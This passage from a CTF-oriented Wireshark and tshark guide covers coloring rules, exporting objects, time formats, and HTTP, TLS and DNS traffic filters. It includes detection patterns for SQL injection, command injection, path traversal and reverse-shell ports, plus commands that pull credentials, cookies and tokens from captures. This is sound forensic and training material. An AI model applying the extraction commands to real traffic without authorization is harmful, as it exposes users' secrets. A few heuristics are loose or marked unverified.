Filter: ftp.request.command == "USER" or ftp.request.command == "PASS"
Background: Cyan

Name: Basic Auth
Filter: http.authbasic
Background: Cyan

Name: HTTP Passwords
Filter: http.request.uri contains "password" or http.file_data contains "password"
Background: Light Blue

Name: Telnet Sessions
Filter: telnet
Background: Cyan
```

**Protocol-Specific Highlighting**

```
Name: SMB/CIFS
Filter: smb or smb2
Background: Light Purple

Name: Database Traffic
Filter: mysql or pgsql or tds
Background: Light Brown

Name: File Transfers
Filter: ftp-data or tftp.data or smb.file_data
Background: Gold

Name: SSH Traffic
Filter: tcp.port == 22
Background: Dark Cyan
```

**Malicious Activity Indicators**

```
Name: Known Bad Ports
Filter: tcp.port in {4444 5555 6666 31337} or udp.port in {4444 5555 6666}
Background: Dark Red

Name: Reverse Shells
Filter: tcp.dstport == 4444 or tcp.dstport == 1234 or tcp.dstport == 8080
Background: Red

Name: Beaconing
Filter: tcp.flags.push==1 and tcp.len < 100
Background: Pink
(Regular small packets might indicate C2 beaconing)

Name: Suspicious User Agents
Filter: http.user_agent contains "python" or http.user_agent contains "curl" or http.user_agent contains "wget"
Background: Orange
```

**Error and Anomaly Detection**

```
Name: TCP Retransmissions
Filter: tcp.analysis.retransmission
Background: Red

Name: TCP Resets
Filter: tcp.flags.reset==1
Background: Dark Red

Name: TCP Out of Order
Filter: tcp.analysis.out_of_order
Background: Orange

Name: Malformed Packets
Filter: _ws.malformed
Background: Black
Foreground: Yellow
```

**Time-Based Analysis**

```
Name: After Hours Activity
Filter: frame.time_relative > 3600 and frame.time_relative < 7200
Background: Light Yellow
(Adjust relative time for your needs)
```

**Advanced Filter Combinations**

```
Name: External Connections
Filter: !(ip.addr == 10.0.0.0/8 or ip.addr == 172.16.0.0/12 or ip.addr == 192.168.0.0/16) and !dns and !ntp
Background: Light Purple

Name: Unencrypted Sensitive Data
Filter: (http or ftp or telnet) and (frame contains "password" or frame contains "admin" or frame contains "root")
Background: Red
Foreground: White

Name: SQL Injection Attempts
Filter: http.request.uri contains "union" or http.request.uri contains "select" or http.request.uri contains "' or"
Background: Red
```

**Coloring Rule Best Practices**

1. **Order Matters**: Place specific rules before general ones
2. **Contrast**: Ensure sufficient contrast between foreground/background
3. **Limit Colors**: Too many colors reduce effectiveness (5-10 active rules recommended)
4. **Test Rules**: Verify filters match intended traffic
5. **Documentation**: Use descriptive names for team collaboration
6. **Performance**: Complex filters can slow rendering on large captures

**Exporting/Importing Custom Rule Sets**

```
# Export rules
Coloring Rules > Export > save as colorfilters

# Import rules
Coloring Rules > Import > select colorfilters file

# Rule file location (Linux)
~/.config/wireshark/colorfilters

# Rule file location (Windows)
%APPDATA%\Wireshark\colorfilters

# Rule file location (macOS)
~/Library/Application Support/Wireshark/colorfilters
```

**Temporary Coloring**

```
# Right-click any packet
Right-click > Colorize Conversation > [Protocol]
Creates temporary rule for that conversation

# Reset temporary colors
View > Reset Colorization
or
View > Coloring Rules > [Uncheck all] > OK
```

## Export Objects

Export Objects extracts files transmitted over the network from protocol dissection, enabling recovery of transferred data without manual stream reconstruction.

**Supported Protocols**

- HTTP/HTTPS (decrypted only)
- SMB/SMB2
- IMF (Internet Message Format - emails)
- TFTP
- DICOM (medical imaging)

**Accessing Export Objects**

```
File > Export Objects > [Protocol]
```

### HTTP Objects Export

**Interface Elements**

- **Packet Number**: Packet containing the object
- **Hostname**: Server hostname from HTTP headers
- **Content Type**: MIME type from HTTP headers
- **Size**: Object size in bytes
- **Filename**: Extracted from Content-Disposition or URL path

**Export Process**

```
1. File > Export Objects > HTTP
2. Review object list
3. Select object(s)
4. Click "Save" or "Save All"
5. Choose destination directory
```

**Filtering Objects**

```
# Use filter box at bottom of Export Objects window
*.jpg                    # All JPEG images
*.php                    # PHP files
index.html              # Specific filename
flag                    # Files containing "flag" in name
text/html               # Filter by content type (in some versions)
```

**CTF HTTP Object Scenarios**

**Scenario 1: Flag in Image File**

```
1. File > Export Objects > HTTP
2. Filter for image types: *.png, *.jpg, *.gif
3. Save all images
4. Examine each file:
   strings image.jpg | grep -i flag
   exiftool image.jpg
   binwalk image.jpg
   steghide extract -sf image.jpg
```

**Scenario 2: Exfiltrated Data**

```
1. Export all objects
2. Check unusual filenames or extensions
3. Examine file types:
   file suspicious_object
4. Search for encoded data:
   cat object | base64 -d
   cat object | xxd
```

**Scenario 3: Web Shell Upload**

```
1. Filter for: *.php, *.asp, *.jsp
2. Export suspicious scripts
3. Analyze content:
   cat shell.php
   grep -i "exec\|system\|passthru" shell.php
```

**Limitations**

- Only extracts complete HTTP transactions
- Cannot reassemble chunked transfers (some versions)
- Requires proper HTTP headers
- HTTPS requires decryption (pre-master secret)

### SMB/SMB2 Objects Export

**Use Case**: Extract files transferred via Windows file sharing protocols

**Export Process**

```
1. File > Export Objects > SMB
   or
   File > Export Objects > SMB2
2. Review file list (shows actual filenames)
3. Select and save objects
```

**SMB Object Information**

- **Packet Number**: Initiating packet
- **Hostname**: SMB server name
- **Content Type**: Always "FILE"
- **Size**: File size
- **Filename**: Actual filename from SMB transaction

**CTF SMB Scenarios**

**Scenario 1: Credential Harvesting**

```
# Look for:
- password.txt
- credentials.xlsx
- confidential documents
- database backups
```

**Scenario 2: Lateral Movement Evidence**

```
# Common attack patterns:
- psexec.exe
- mimikatz.exe
- *.ps1 (PowerShell scripts)
- *.bat (batch files)
```

**Command-Line Alternative (tshark)**

```bash
# Export all SMB objects
tshark -r capture.pcap --export-objects smb,./smb_exports/

# List without exporting
tshark -r capture.pcap -Y smb2 -T fields -e smb2.filename | sort -u
```

### TFTP Objects Export

**Use Case**: Extract files from Trivial File Transfer Protocol (common in network device configs, PXE boot)

**Export Process**

```
File > Export Objects > TFTP
```

**TFTP Characteristics**

- No authentication
- UDP-based (port 69)
- Common for configuration backups
- Network equipment management

**CTF TFTP Scenarios**

```
# Common files:
- Router/switch configs
- Firmware images
- Boot files
- Configuration backups containing credentials
```

**Manual TFTP Analysis**

```
# Filter for TFTP in Wireshark
tftp

# Display filter for specific operations
tftp.opcode == 3    # Data packets
tftp.opcode == 1    # Read request
tftp.opcode == 2    # Write request

# Follow UDP stream for complete file
Right-click TFTP packet > Follow > UDP Stream
```

### IMF (Email) Objects Export

**Use Case**: Extract email messages and attachments from SMTP, POP3, IMAP traffic

**Export Process**

```
File > Export Objects > IMF
```

**Email Object Contents**

- Complete email messages (.eml format)
- Inline attachments
- HTML email bodies
- Plain text content

**CTF Email Scenarios**

**Scenario 1: Flag in Email Body**

```
1. Export all IMF objects
2. Open .eml files in text editor
3. Search for flags:
   grep -r "flag{" ./exported_emails/
   grep -r "CTF{" ./exported_emails/
```

**Scenario 2: Malicious Attachments**

```
1. Export emails
2. Extract attachments from .eml:
   munpack message.eml
3. Analyze attachment content
```

**Scenario 3: Encoded Data**

```
# Check for Base64 encoded attachments
grep -A 100 "Content-Transfer-Encoding: base64" message.eml | base64 -d > decoded_file
```

**Manual Email Protocol Analysis**

```
# SMTP traffic
tcp.port == 25

# POP3 traffic
tcp.port == 110

# IMAP traffic
tcp.port == 143

# Follow stream to see complete transaction
Right-click > Follow > TCP Stream
```

### DICOM Objects Export

**Use Case**: Medical imaging files (uncommon in CTFs but possible in healthcare scenarios)

```
File > Export Objects > DICOM
```

### Advanced Export Techniques

**Extracting Objects Without GUI (tshark)**

```bash
# HTTP objects
tshark -r capture.pcap --export-objects http,./http_objects/

# SMB objects
tshark -r capture.pcap --export-objects smb,./smb_objects/

# TFTP objects
tshark -r capture.pcap --export-objects tftp,./tftp_objects/

# IMF objects
tshark -r capture.pcap --export-objects imf,./email_objects/

# DICOM objects
tshark -r capture.pcap --export-objects dicom,./dicom_objects/
```

**Scripted Bulk Export**

```bash
#!/bin/bash
# Export all object types from capture

PCAP="$1"
OUTDIR="./exported_objects"

mkdir -p "$OUTDIR"/{http,smb,tftp,imf}

tshark -r "$PCAP" --export-objects http,"$OUTDIR/http/"
tshark -r "$PCAP" --export-objects smb,"$OUTDIR/smb/"
tshark -r "$PCAP" --export-objects tftp,"$OUTDIR/tftp/"
tshark -r "$PCAP" --export-objects imf,"$OUTDIR/imf/"

echo "Export complete. Objects saved to $OUTDIR"
```

**Post-Export Analysis Workflow**

```bash
# Identify file types
find ./exported_objects -type f -exec file {} \;

# Search for flags
grep -r "flag{" ./exported_objects/
grep -r "CTF{" ./exported_objects/

# Find encoded data
find ./exported_objects -type f -exec sh -c 'strings "$1" | grep -E "^[A-Za-z0-9+/=]{20,}$"' _ {} \;

# Check for steganography
for img in ./exported_objects/http/*.{jpg,png,gif}; do
    echo "Checking $img"
    steghide info "$img"
done

# Examine metadata
find ./exported_objects -type f \( -name "*.jpg" -o -name "*.png" \) -exec exiftool {} \;
```

**Troubleshooting Export Issues**

[Inference] Common issues and potential solutions:

1. **No objects appear**: Capture may not contain complete HTTP/SMB transactions
    
    - Verify: Statistics > Protocol Hierarchy shows HTTP/SMB traffic
    - Check: Apply display filter for protocol first
2. **Incomplete files**: Packet capture may have been stopped mid-transfer
    
    - Verify: Check for TCP retransmissions or missing segments
3. **Cannot export HTTPS**: Encrypted traffic requires decryption
    
    - Solution: Provide pre-master secret log (from browser/client)
    - Edit > Preferences > Protocols > TLS > (Pre)-Master-Secret log filename
4. **SMB export empty**: May be SMB3 encrypted
    
    - Check SMB version: smb2.cmd
    - SMB3 encryption requires session keys

**Export Objects Limitations**

[Unverified - these are common observed limitations but may vary by Wireshark version]:

- Chunked HTTP transfers may not export correctly in older versions
- Compressed HTTP content requires proper headers to decompress
- Partial captures result in incomplete objects
- Large objects may timeout or fail to export
- Protocol dissection must be successful for export to work

## Time Display Formats

Time display formats control how Wireshark presents packet timestamps, critical for timeline analysis, correlation, and identifying temporal patterns.

**Accessing Time Display Settings**

```
View > Time Display Format
```

**Available Format Options**

### Date and Time of Day

```
Format: YYYY-MM-DD HH:MM:SS.microseconds
Example: 2025-10-19 14:32:45.123456
```

**Use Case**: Absolute timestamps for correlation with external logs (firewall, IDS, server logs)

**Setting**: `View > Time Display Format > Date and Time of Day`

**CTF Scenario**: Correlating network activity with authentication logs

```
1. Note timestamp of suspicious packet: 2025-10-19 14:32:45
2. Cross-reference with /var/log/auth.log
3. Identify concurrent events
```

### Time of Day

```
Format: HH:MM:SS.microseconds
Example: 14:32:45.123456
```

**Use Case**: Same-day analysis when date is constant

**Setting**: `View > Time Display Format > Time of Day`

### Seconds Since Beginning of Capture

```
Format: N.microseconds
Example: 42.123456 (42 seconds after first packet)
```

**Use Case**: Analyzing attack progression, timing attacks, measuring durations

**Setting**: `View > Time Display Format > Seconds Since Beginning of Capture`

**CTF Scenario**: Measuring time between port scan and exploitation attempt

```
1. Find first SYN packet: 0.000000
2. Find exploit packet: 15.342891
3. Duration: 15.34 seconds
```

### Seconds Since Previous Captured Packet

```
Format: N.microseconds (time since last packet)
Example: 0.000234
```

**Use Case**: Identifying delays, packet spacing, timing anomalies

**Setting**: `View > Time Display Format > Seconds Since Previous Captured Packet`

**CTF Scenario**: Detecting beaconing malware

```
# Regular intervals suggest C2 beaconing
Packet 100: 10.000123
Packet 101: 9.999987
Packet 102: 10.000456
Pattern: ~10 second intervals
```

### Seconds Since Previous Displayed Packet

```
Format: N.microseconds (time since last displayed packet after filters)
Example: 0.001234
```

**Use Case**: Time intervals within filtered traffic only

**Setting**: `View > Time Display Format > Seconds Since Previous Displayed Packet`

**Example**: With `http` filter applied

```
Shows time gaps between HTTP requests only, ignoring other traffic
```

### Seconds Since First Captured Packet

```
Format: N.microseconds (relative to packet 1)
Example: 125.456789
```

**Use Case**: Same as "Seconds Since Beginning of Capture" (legacy naming)

### UTC Date and Time of Day

```
Format: YYYY-MM-DD HH:MM:SS.microseconds (UTC)
Example: 2025-10-19 06:32:45.123456
```

**Use Case**: International investigations, coordinating across time zones

**Setting**: `View > Time Display Format > UTC Date and Time of Day`

### UTC Time of Day

```
Format: HH:MM:SS.microseconds (UTC)
Example: 06:32:45.123456
```

**Use Case**: UTC time-only display

### Time Display Precision

**Accessing Precision Settings**

```
View > Time Display Format > [Precision Submenu]
```

**Available Precision Levels**

- **Automatic**: Wireshark decides based on timestamps
- **Seconds**: No fractional seconds
- **Deciseconds**: 0.1 second precision
- **Centiseconds**: 0.01 second precision
- **Milliseconds**: 0.001 second precision (common default)
- **Microseconds**: 0.000001 second precision
- **Nanoseconds**: 0.000000001 second precision

**Selecting Precision**

```
View > Time Display Format > Automatic
View > Time Display Format > Seconds
View > Time Display Format > Milliseconds
View > Time Display Format > Microseconds
View > Time Display Format > Nanoseconds
```

**CTF Timing Analysis Requirements**

**Millisecond Precision**: Sufficient for most network analysis

```
Use for: Connection timing, response times, basic timing attacks
```

**Microsecond Precision**: Required for low-level timing analysis

```
Use for: TTL-based geolocation, timing side-channels, precise synchronization
```

**Nanosecond Precision**: Rarely needed unless analyzing high-speed networks

```
Use for: Sub-microsecond timing attacks, hardware-level analysis
```

### Time Reference Points

**Setting Time Reference**

```
Right-click packet > Set/Unset Time Reference
or
Edit > Set/Unset Time Reference (Ctrl+T)
```

**Effect**: Selected packet becomes time 0.00000 for relative time displays

**Visual Indicator**: Reference packets marked with `*REF*` in Time column

**Use Case**: Measure duration from specific event

```
1. Set reference at attack start packet
2. Switch to "Seconds Since Beginning of Capture"
3. All subsequent times show seconds since attack start
```

**Multiple Reference Points**

```
# Set multiple references to segment analysis
Packet 100: *REF* (reconnaissance phase)
Packet 500: *REF* (exploitation phase)
Packet 900: *REF* (data exfiltration phase)
```

**Clearing Reference Points**

```
Edit > Unset All Time References
```

### Time Shift (Adjusting Timestamps)

**Accessing Time Shift**

```
Edit > Time Shift
```

**Use Cases**

- Align captures from different systems with clock skew
- Normalize timestamps for correlation
- Adjust for timezone differences

**Time Shift Dialog Options**

```
- Shift all packets by: [offset]
- Set time to: [absolute time] for selected packet
- Apply offset to all frames
```

**Example: Correcting 2-hour time difference**

```
1. Edit > Time Shift
2. Shift all packets by: -2:00:00
3. Apply
```

**CTF Scenario: Multi-source correlation**

```
Capture A: Server logs (correct time)
Capture B: Client capture (2 minutes fast)

Solution:
1. Open Capture B in Wireshark
2. Edit > Time Shift
3. Shift all packets by: -0:02:00
4. Merge or correlate with Capture A
```

### Practical CTF Time Analysis Techniques

**Technique 1: Attack Timeline Construction**

```
1. Set display format: Date and Time of Day
2. Apply filter: ip.addr == [attacker_ip]
3. Export packet list: File > Export Packet Dissections > As CSV
4. Build timeline in spreadsheet or timeline tool
```

**Technique 2: Identifying Automated vs. Manual Activity**

```
1. Set display format: Seconds Since Previous Captured Packet
2. Filter for attacker traffic
3. Analyze timing patterns:
   - Consistent intervals (< 1ms) = automated
   - Irregular intervals = manual/human
```

**Technique 3: Measuring Attack Duration**

```
1. Find first attack packet (e.g., port scan start)
2. Right-click > Set Time Reference
3. Set display format: Seconds Since Beginning of Capture
4. Find last attack packet
5. Note timestamp = total attack duration
```

**Technique 4: Correlating with External Logs**

```
# Convert Wireshark time to match syslog format
1. Set display format: UTC Date and Time of Day
2. Export CSV with timestamps
3. Join with syslog entries by timestamp
```

**Technique 5: Detecting Time-Based Covert Channels**

```
# Look for data encoded in packet timing
1. Set display format: Seconds Since Previous Displayed Packet
2. Filter protocol: icmp
3. Analyze inter-packet intervals
4. Convert intervals to binary/data

Example: Intervals encode bits
0.100s = 0
0.200s = 1
Pattern: 0.100, 0.200, 0.200, 0.100 = 0110
```

**Technique 6: Timing Side-Channel Analysis**

```
# Measure server response times for different inputs
1. Filter: http.request
2. Set display: Microseconds precision
3. Note time of request
4. Find corresponding response
5. Calculate delta = response time
6. Compare response times for different inputs
```

### Command-Line Time Options (tshark)

```bash
# Display absolute timestamps
tshark -r capture.pcap -t a

# Display delta time (previous packet)
tshark -r capture.pcap -t d

# Display delta time (previous displayed)
tshark -r capture.pcap -t dd

# Display relative time (first packet)
tshark -r capture.pcap -t r

# Display epoch time
tshark -r capture.pcap -t e

# Display UTC
tshark -r capture.pcap -t u

# Timestamp precision
tshark -r capture.pcap -t a --time-precision ns  # Nanoseconds
tshark -r capture.pcap -t a --time-precision us  # Microseconds  
tshark -r capture.pcap -t a --time-precision ms  # Milliseconds
```

**Extracting Timing Data for Analysis**

```bash
# Export timestamps with packet numbers
tshark -r capture.pcap -T fields -e frame.number -e frame.time_epoch

# Calculate inter-arrival times
tshark -r capture.pcap -T fields -e frame.time_delta_displayed

# Export timing for specific traffic
tshark -r capture.pcap -Y 'http.request' -T fields -e frame.time -e frame.time_delta

# Create timing profile
tshark -r capture.pcap -Y 'ip.src == 192.168.1.100' -T fields -e frame.time_relative > timing_profile.txt
```

**Statistical Time Analysis**

```bash
# IO statistics with time intervals
tshark -r capture.pcap -q -z io,stat,1  # 1-second buckets

# Response time for HTTP
tshark -r capture.pcap -q -z http,tree

# Service response time
tshark -r capture.pcap -q -z tcp,srt
```

---

**Important Subtopics for Further Study**

- **Packet Timestamps and Capture Methods**: Understanding hardware timestamping vs. software timestamping
- **NTP Synchronization Analysis**: Detecting time synchronization issues in distributed captures
- **Wireshark Profiles**: Creating custom profiles with preset time formats and coloring rules for different CTF scenarios

---

# Protocol Analysis

## HTTP/HTTPS Traffic Analysis

HTTP (Hypertext Transfer Protocol) and HTTPS (HTTP over TLS/SSL) traffic analysis is fundamental for CTF challenges involving web exploitation, credential harvesting, session hijacking, and data exfiltration.

### HTTP Protocol Structure

**HTTP Request Components:**

```
METHOD /path/to/resource HTTP/1.1
Host: example.com
Header-Name: Header-Value
[Additional Headers]

[Request Body - for POST/PUT]
```

**HTTP Response Components:**

```
HTTP/1.1 STATUS_CODE Status Message
Header-Name: Header-Value
[Additional Headers]

[Response Body]
```

### Wireshark HTTP Analysis Techniques

**Basic HTTP Filtering:**

```bash
# All HTTP traffic
http

# HTTP requests only
http.request

# HTTP responses only
http.response

# Specific HTTP methods
http.request.method == "GET"
http.request.method == "POST"
http.request.method == "PUT"
http.request.method == "DELETE"
http.request.method == "HEAD"
http.request.method == "OPTIONS"
http.request.method == "PATCH"

# HTTP version
http.request.version == "HTTP/1.1"
http.request.version == "HTTP/2"
```

**HTTP Status Code Analysis:**

```bash
# Success responses (2xx)
http.response.code >= 200 && http.response.code < 300
http.response.code == 200  # OK
http.response.code == 201  # Created
http.response.code == 204  # No Content

# Redirection responses (3xx)
http.response.code >= 300 && http.response.code < 400
http.response.code == 301  # Moved Permanently
http.response.code == 302  # Found (Temporary Redirect)
http.response.code == 304  # Not Modified

# Client error responses (4xx)
http.response.code >= 400 && http.response.code < 500
http.response.code == 400  # Bad Request
http.response.code == 401  # Unauthorized
http.response.code == 403  # Forbidden
http.response.code == 404  # Not Found
http.response.code == 405  # Method Not Allowed

# Server error responses (5xx)
http.response.code >= 500
http.response.code == 500  # Internal Server Error
http.response.code == 502  # Bad Gateway
http.response.code == 503  # Service Unavailable
```

**HTTP Header Analysis:**

```bash
# Host header
http.host == "target.com"
http.host contains "admin"

# User-Agent analysis
http.user_agent contains "curl"
http.user_agent contains "python"
http.user_agent contains "sqlmap"
http.user_agent contains "nikto"
http.user_agent contains "Burp"

# Referer header
http.referer contains "google"
http.referer

# Authorization header (basic auth, bearer tokens)
http.authorization
http.authorization contains "Basic"
http.authorization contains "Bearer"

# Cookie analysis
http.cookie
http.cookie contains "session"
http.cookie contains "PHPSESSID"
http.cookie contains "admin"

# Set-Cookie header
http.set_cookie
http.set_cookie contains "HttpOnly"
http.set_cookie contains "Secure"

# Content-Type header
http.content_type == "application/json"
http.content_type == "application/x-www-form-urlencoded"
http.content_type == "multipart/form-data"
http.content_type contains "text/html"

# Content-Length
http.content_length > 10000
http.content_length

# Accept header
http.accept contains "application/json"

# Custom headers
http.request.line contains "X-Forwarded-For"
http.request.line contains "X-Real-IP"
http.request.line contains "X-Custom-Header"
```

**URI and Query Parameter Analysis:**

```bash
# URI path
http.request.uri == "/admin"
http.request.uri contains "/admin"
http.request.uri contains ".php"
http.request.uri contains "flag"
http.request.uri contains "id="

# File extensions
http.request.uri matches "\\.(php|asp|aspx|jsp)$"
http.request.uri matches "\\.(txt|log|bak)$"

# Query parameters
http.request.uri contains "?"
http.request.uri contains "id=1"
http.request.uri contains "cmd="
http.request.uri contains "exec="

# Full URI (including host)
http.request.full_uri contains "target.com/secret"

# Path segments
http.request.uri.path == "/api/v1/users"
```

**POST Data Analysis:**

```bash
# POST requests
http.request.method == "POST"

# Form data
http.file_data contains "username"
http.file_data contains "password"
http.file_data contains "email"

# JSON payloads
http.file_data contains "{"
(http.request.method == "POST") && (http.content_type contains "json")

# File uploads
http.content_type contains "multipart/form-data"
http.request.method == "POST" && frame.len > 5000
```

**HTTP Request/Response Pairing:**

```bash
# Follow HTTP stream
Right-click packet → Follow → HTTP Stream

# Or use filter
http.stream eq 0  # First HTTP stream
http.stream eq 5  # Sixth HTTP stream

# Request/response in same conversation
tcp.stream eq 0 && http
```

### HTTP Traffic Extraction Techniques

**Export HTTP Objects:**

```
File → Export Objects → HTTP
```

This extracts files transferred over HTTP (images, scripts, documents, executables).

**Command-Line Extraction with tshark:**

```bash
# Export all HTTP objects
tshark -r capture.pcap --export-objects http,output_directory/

# Filter and export specific HTTP traffic
tshark -r capture.pcap -Y "http.request.method == POST" -T fields -e http.file_data

# Extract HTTP headers
tshark -r capture.pcap -Y "http.request" -T fields -e http.request.method -e http.host -e http.request.uri

# Extract cookies
tshark -r capture.pcap -Y "http.cookie" -T fields -e http.cookie

# Extract authorization headers
tshark -r capture.pcap -Y "http.authorization" -T fields -e http.authorization

# Extract POST data
tshark -r capture.pcap -Y "http.request.method == POST" -T fields -e http.file_data -e http.request.uri
```

**Scripted HTTP Analysis:**

```bash
# Extract all URLs
tshark -r capture.pcap -Y "http.request" -T fields -e http.request.full_uri | sort -u

# Extract credentials from POST requests
tshark -r capture.pcap -Y "http.request.method == POST && http.file_data contains password" -T fields -e ip.src -e http.host -e http.file_data

# Find suspicious user agents
tshark -r capture.pcap -Y "http.user_agent" -T fields -e http.user_agent | sort | uniq -c | sort -rn

# Extract session cookies
tshark -r capture.pcap -Y "http.cookie" -T fields -e ip.src -e http.host -e http.cookie | grep -i session
```

### HTTP Attack Pattern Detection

**SQL Injection Indicators:**

```bash
# URI-based SQLi
http.request.uri contains "' OR"
http.request.uri contains "UNION SELECT"
http.request.uri contains "1=1"
http.request.uri contains "admin'--"
http.request.uri contains "sleep("
http.request.uri contains "benchmark("

# POST-based SQLi
http.file_data contains "' OR '"
http.file_data contains "UNION SELECT"
```

**Command Injection Indicators:**

```bash
# Common command injection patterns
http.request.uri contains "cmd="
http.request.uri contains "|"
http.request.uri contains ";"
http.request.uri contains "`"
http.request.uri contains "$("
http.request.uri contains "cat "
http.request.uri contains "ls "
http.request.uri contains "/etc/passwd"
```

**Path Traversal Indicators:**

```bash
# Directory traversal
http.request.uri contains "../"
http.request.uri contains "..%2f"
http.request.uri contains "..%5c"
http.request.uri contains "%2e%2e"
```

**File Inclusion Indicators:**

```bash
# LFI/RFI patterns
http.request.uri contains "file="
http.request.uri contains "page="
http.request.uri contains "include="
http.request.uri contains "http://"
http.request.uri contains "/etc/"
http.request.uri contains "php://filter"
http.request.uri contains "php://input"
```

**XSS Indicators:**

```bash
# Script injection patterns
http.request.uri contains "<script"
http.request.uri contains "onerror="
http.request.uri contains "onload="
http.request.uri contains "javascript:"
```

**Web Shell Detection:**

```bash
# Common web shell parameters
http.request.uri contains "cmd"
http.request.uri contains "exec"
http.request.uri contains "command"
http.request.uri contains "shell"
(http.request.method == "POST") && (http.file_data contains "system(" || http.file_data contains "exec(")
```

### HTTPS/TLS Traffic Analysis

**TLS Handshake Analysis:**

```bash
# All TLS traffic
tls

# TLS handshake packets
tls.handshake

# Client Hello
tls.handshake.type == 1

# Server Hello
tls.handshake.type == 2

# Certificate
tls.handshake.type == 11

# Server Hello Done
tls.handshake.type == 14

# Client Key Exchange
tls.handshake.type == 16

# Finished
tls.handshake.type == 20
```

**TLS Version Analysis:**

```bash
# TLS 1.0
tls.record.version == 0x0301

# TLS 1.1
tls.record.version == 0x0302

# TLS 1.2
tls.record.version == 0x0303

# TLS 1.3
tls.record.version == 0x0304

# Outdated SSL versions (security issue)
ssl.record.version == 0x0300  # SSL 3.0
ssl.record.version == 0x0200  # SSL 2.0
```

**Server Name Indication (SNI) Analysis:**

```bash
# SNI field (reveals target hostname in encrypted traffic)
tls.handshake.extensions_server_name

# Specific domain
tls.handshake.extensions_server_name == "target.com"
tls.handshake.extensions_server_name contains "admin"

# Extract all SNI values
tshark -r capture.pcap -Y "tls.handshake.extensions_server_name" -T fields -e tls.handshake.extensions_server_name | sort -u
```

**Certificate Analysis:**

```bash
# Certificate subject
tls.handshake.certificate

# Extract certificate details
x509ce.dNSName  # Subject Alternative Name
x509sat.commonName  # Common Name

# Self-signed certificates (potential MITM)
tls.handshake.certificate && x509sat.commonName

# Certificate issuer
x509sat.issuer
```

**Cipher Suite Analysis:**

```bash
# Cipher suite selection
tls.handshake.ciphersuite

# Weak ciphers
tls.handshake.ciphersuite == 0x0005  # TLS_RSA_WITH_RC4_128_SHA
tls.handshake.ciphersuite == 0x000a  # TLS_RSA_WITH_3DES_EDE_CBC_SHA
```

**TLS Alert Messages:**

```bash
# TLS alerts (errors/warnings)
tls.alert_message

# Alert level
tls.alert_message.level == 1  # Warning
tls.alert_message.level == 2  # Fatal

# Alert descriptions
tls.alert_message.desc == 0   # close_notify
tls.alert_message.desc == 20  # bad_record_mac
tls.alert_message.desc == 40  # handshake_failure
tls.alert_message.desc == 42  # bad_certificate
tls.alert_message.desc == 51  # decrypt_error
```

### HTTPS Decryption Techniques

**Method 1: Using Pre-Master Secret (SSLKEYLOGFILE):**

If you have the session keys from a browser or tool that logs them:

```bash
# Set environment variable before running browser
export SSLKEYLOGFILE=/path/to/sslkeys.log

# In Wireshark
Edit → Preferences → Protocols → TLS
→ (Pre)-Master-Secret log filename: /path/to/sslkeys.log
```

**Method 2: Using Server Private Key:**

```bash
# In Wireshark
Edit → Preferences → Protocols → TLS → RSA keys list
→ Add: IP Address, Port, Protocol, Key File, Password
```

[Unverified: This method only works with RSA key exchange, not with Diffie-Hellman or ECDHE cipher suites which provide forward secrecy]

**Method 3: MITM Proxy Decryption:**

```bash
# Using mitmproxy to intercept and decrypt HTTPS
mitmproxy -w decrypted_traffic.mitm

# Convert to pcap (requires additional tools)
mitmdump -r decrypted_traffic.mitm -w output.pcap

# Using Burp Suite
# Export traffic and analyze in Wireshark with provided keys
```

### HTTP/2 Analysis

```bash
# HTTP/2 traffic
http2

# HTTP/2 headers
http2.header

# HTTP/2 header name/value
http2.header.name == ":method"
http2.header.value == "GET"

# HTTP/2 data frames
http2.data

# HTTP/2 streams
http2.streamid == 1
```

### Practical CTF Scenarios

**Scenario 1: Credential Harvesting**

```bash
# Find login attempts
http.request.method == "POST" && (http.request.uri contains "login" || http.request.uri contains "signin")

# Extract credentials from POST data
tshark -r capture.pcap -Y "http.request.method == POST" -T fields -e http.file_data | grep -E "(username|password|user|pass)"

# Look for Basic Authentication
http.authorization contains "Basic"
tshark -r capture.pcap -Y "http.authorization contains Basic" -T fields -e http.authorization | cut -d' ' -f2 | base64 -d
```

**Scenario 2: Session Token Extraction**

```bash
# Find session cookies
http.cookie contains "session" || http.cookie contains "token"

# Extract session tokens
tshark -r capture.pcap -Y "http.cookie" -T fields -e http.cookie | grep -i session

# Find Set-Cookie headers
http.set_cookie contains "session"
```

**Scenario 3: API Key Discovery**

```bash
# Look for API keys in headers
http.request.line contains "X-API-Key" || http.request.line contains "Authorization: Bearer"

# Extract Authorization headers
tshark -r capture.pcap -Y "http.authorization" -T fields -e http.authorization

# Search in query parameters
http.request.uri contains "api_key=" || http.request.uri contains "token="
```

**Scenario 4: File Upload Analysis**

```bash
# Find file uploads
http.content_type contains "multipart/form-data"

# Large POST requests (potential file uploads)
http.request.method == "POST" && frame.len > 10000

# Export uploaded files
File → Export Objects → HTTP
```

**Scenario 5: Data Exfiltration Detection**

```bash
# Large responses (potential data dump)
http.response && http.content_length > 100000

# Suspicious file downloads
http.response.code == 200 && (http.content_type contains "application/octet-stream" || http.content_type contains "application/zip")

# Encoded data in requests (potential exfiltration)
http.request.uri matches "[A-Za-z0-9+/]{50,}={0,2}"
```

## DNS Query/Response Analysis

DNS (Domain Name System) traffic analysis is critical for detecting command-and-control (C2) communication, DNS tunneling, data exfiltration, and identifying malicious domains in CTF challenges.

### DNS Protocol Structure

**DNS Header:**

- Transaction ID
- Flags (QR, Opcode, AA, TC, RD, RA, Z, RCODE)
- Question count
- Answer count
- Authority count
- Additional count

**DNS Query:** Contains question section with query name, type, and class

**DNS Response:** Contains question section plus answer, authority, and additional sections

### Wireshark DNS Filtering

**Basic DNS Filters:**

```bash
# All DNS traffic
dns

# DNS queries only
dns.flags.response == 0

# DNS responses only
dns.flags.response == 1

# DNS over TCP (unusual, may indicate large responses or zone transfers)
tcp.port == 53

# DNS over UDP (standard)
udp.port == 53

# DNS over HTTPS (DoH)
tcp.port == 443 && http2.header.name == ":path" && http2.header.value contains "/dns-query"

# DNS over TLS (DoT)
tcp.port == 853
```

**DNS Query Name Analysis:**

```bash
# Specific domain query
dns.qry.name == "example.com"

# Domain contains substring
dns.qry.name contains "target"
dns.qry.name contains "admin"

# Wildcard/regex matching
dns.qry.name matches ".*\\.target\\.com$"
dns.qry.name matches "^[a-f0-9]{32}\\."  # Hexadecimal subdomain

# Case-insensitive matching
dns.qry.name.len > 50  # Long domain names (potential tunneling)
```

**DNS Query Type Analysis:**

```bash
# A record (IPv4 address)
dns.qry.type == 1

# NS record (nameserver)
dns.qry.type == 2

# CNAME record (canonical name)
dns.qry.type == 5

# SOA record (start of authority)
dns.qry.type == 6

# PTR record (pointer/reverse lookup)
dns.qry.type == 12

